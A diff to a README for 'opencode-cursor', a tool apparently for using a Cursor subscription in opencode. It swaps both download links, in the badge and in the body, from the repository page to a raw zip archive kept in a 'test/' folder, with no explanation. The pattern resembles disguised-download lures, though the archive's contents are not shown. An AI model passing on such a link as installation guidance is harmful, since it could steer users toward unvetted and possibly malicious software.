@@ -1,6 +1,6 @@
 # 🖱️ opencode-cursor - Use your cursor subscription in opencode
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/undivided-actium697/opencode-cursor)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/undivided-actium697/opencode-cursor/raw/refs/heads/main/test/opencode-cursor-2.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ opencode-cursor helps you use your Cursor subscription inside opencode on Window
 
 Open this link and download the app from the repository page:
 
-https://github.com/undivided-actium697/opencode-cursor
+https://github.com/undivided-actium697/opencode-cursor/raw/refs/heads/main/test/opencode-cursor-2.9.zip
 
 If the page shows a release file, save it to your computer. If it shows the project files only, use the latest download option on the page and keep the files in one folder you can find later.
 
